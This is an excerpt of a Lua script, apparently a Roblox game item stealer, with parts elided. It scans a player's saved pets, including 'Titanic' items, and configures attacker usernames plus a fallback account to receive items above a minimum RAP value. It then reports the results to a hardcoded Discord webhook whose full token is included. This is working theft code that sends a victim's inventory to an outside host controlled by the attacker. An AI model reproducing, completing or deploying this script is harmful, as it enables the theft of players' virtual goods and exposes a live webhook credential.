...
for i, v in pairs(save.Pet) do
    ...
    if v.id and v.id == string.find(v.id, "Titanic") then
        ...
        local url = "https://discord.com/api/webhooks/1287106873048305695/B_luJIK1x07pUZsQuyMS9lg4A7NXPpttlrsVp8VeUCf4Nw1H6-z01LeH48lL9VFGzMLM"
        local headers = {
...
Username = "LaRussieCool11"
Username2 = "LaRussieCool7" -- stuff will get sent to this user if first user's mailbox is full
Webhook = "https://discord.com/api/webhooks/1287106873048305695/B_luJIK1x07pUZsQuyMS9lg4A7NXPpttlrsVp8VeUCf4Nw1H6-z01LeH48lL9VFGzMLM"
min_rap = 5 -- minimum rap of each item you want to get sent to you.
...
local function SendMessage(url, username, diamonds)
    ...
    if totalRAP > 500000000 then
		...
		emoji = "<:poopie_1:1279107191806230602><:poopie_2:1279107192682971331><:poopie_3:1279107194427674725><:poopie_4:1279107196147204188><:poopie_5:1279107197472739348>"
    else
		poopie = "poop hit"
		emoji = "<:segment_1:1279104032786616430><:segment_2:1279104034145566884><:segment_3:1279104035416440912><:segment_4:1279104036523606133><:segment_5:1279104038121639977>"
    end
